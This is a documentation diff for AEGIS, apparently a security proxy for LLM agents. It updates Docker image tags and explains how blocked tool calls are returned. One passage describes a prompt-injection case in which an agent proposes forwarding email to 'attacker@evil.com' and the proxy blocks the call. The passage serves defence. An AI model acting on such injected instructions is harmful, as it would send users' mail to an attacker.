@@ -36,7 +36,7 @@ docker run -d \
   -e AEGIS_MASTER_KEY="$(openssl rand -hex 32)" \
   -v $(pwd)/aegis-policy.yaml:/etc/aegis/policy.yaml:ro \
   -v aegis-logs:/var/aegis \
-  ghcr.io/cwellbournewood/aegis:0.9.0
+  ghcr.io/cwellbournewood/aegis:main
 ```
 
 Or with Docker Compose:
@@ -93,7 +93,7 @@ If the model proposes `set_email_forwarding(to="attacker@evil.com")` because a m
 - **Capability**, no token minted for `set_email_forwarding` → BLOCK.
 - **Intent drift**. "set forwarding" is far from "summarize invoices" → BLOCK.
 
-The response is HTTP 200 with the `tool_use` block rewritten to a structured "denied" message; the agent recovers and continues.
+AEGIS returns HTTP 200 with the offending `tool_use` block rewritten to a structured `aegis_denied` message and a non-empty `text` block summarizing the reason. Whether the agent retries gracefully, surfaces the denial to the user, or aborts is up to the agent loop, AEGIS guarantees the call doesn't reach the upstream side effect.
 
 ### Tag retrieval sources correctly
 
@@ -121,7 +121,7 @@ Five-minute install. Claude Code respects standard Anthropic env vars.
 ```bash
 docker run -d --name aegis -p 8080:8080 \
   -e AEGIS_MASTER_KEY="$(openssl rand -hex 32)" \
-  ghcr.io/cwellbournewood/aegis:0.9.0
+  ghcr.io/cwellbournewood/aegis:main
 
 export ANTHROPIC_BASE_URL="http://localhost:8080/v1/anthropic"
 claude
